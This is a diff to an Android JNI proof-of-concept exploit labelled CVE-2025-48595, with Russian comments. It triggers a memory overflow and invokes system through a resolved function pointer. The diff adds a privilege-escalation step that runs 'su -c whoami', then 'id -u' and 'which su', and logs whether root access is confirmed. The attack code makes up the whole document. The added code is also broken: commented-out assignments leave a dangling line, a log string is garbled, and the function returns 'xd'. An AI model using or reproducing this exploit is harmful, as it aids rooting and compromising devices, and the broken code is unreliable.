@@ -7,6 +7,7 @@
 #include <cstdio>
 #include <dlfcn.h>
 #include <unistd.h>
+#include <stdio.h> // Добавлен для popen/fscanf
 
 #define LOG_TAG "CVE-2025-48595"
 #define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
@@ -17,7 +18,7 @@ typedef int (*system_func_t)(const char *);
 
 extern "C" JNIEXPORT jstring JNICALL
 Java_com_example_android_1poc_MainActivity_triggerOverflowExploit(JNIEnv* env, jobject /* this */, jint sizeHint) {
-
+//    usleep(20000000);
     LOGI("=== EXPLOIT: WRITING 'su' COMMAND INTO MEMORY (FILE OUTPUT) ===");
 
     // 1. Переполнение
@@ -82,8 +83,44 @@ Java_com_example_android_1poc_MainActivity_triggerOverflowExploit(JNIEnv* env, j
     LOGI("   File check:");
     real_system(check_cmd);
 
-    free(buffer);
+    // Замени этот блок Step 7:
+    LOGI("Step 7: Attempting privilege escalation via 'su':");
 
-    std::string result_str = "Exploit Done. Check Logcat for 'START RESULT' and UID info.";
-    return env->NewStringUTF(result_str.c_str());
+    // Простая команда, где су запускается напрямую через system
+    int su_result = real_system("su -c 'whoami'");
+
+    if (su_result == 0) {
+        FILE* fp = popen("id -u", "r");
+        int uid = 0;
+        if (fp && fscanf(fp, "%d", &uid) == 1) {
+            pclose(fp);
+            LOGI("   UID from su: %d", uid);
+//            result_str = (uid == 0) ? "EXPLOIT FULLY WORKING: ROOT ACCESS CONFIRMED." :
+                         "Exploit ran, but su returned UID " + std::to_string(uid) + ".";
+            LOGI(">>> FINAL STATUS: + <result_str??dead(please_never_write_result_str_like_this)> + <<<");
+        } else {
+            if (fp) pclose(fp);
+//            result_str = "Exploit ran. 'su' command executed (code 0), but UID check failed.";
+            LOGW(">>> FINAL STATUS: SU EXECUTED, BUT CHECK FAILED <<<");
+        }
+    } else {
+        LOGE("   Failed to execute 'su -c whoami'. Return code: %d", su_result);
+        // Проверяем, есть ли вообще su в системе
+        FILE* check_su = popen("which su", "r");
+        if (check_su) {
+            char path[64];
+            fgets(path, sizeof(path), check_su);
+            pclose(check_su);
+            LOGI("   'su' found at: %s", path);
+//            result_str = "'su' exists but returned code " + std::to_string(su_result) + ". Check permissions.";
+            LOGI("'su' exists but returned code std::to_string(su_result). Check permissions.");
+        } else {
+            LOGI("'su' command not found or failed to execute.");
+//            result_str = "'su' command not found or failed to execute.";
+        }
+        LOGW(">>> FINAL STATUS: SU FAILED (code %d) <<<", su_result);
+    }
+
+    free(buffer);
+    return env->NewStringUTF(/*result_str.c_str()*/"xd");
 }
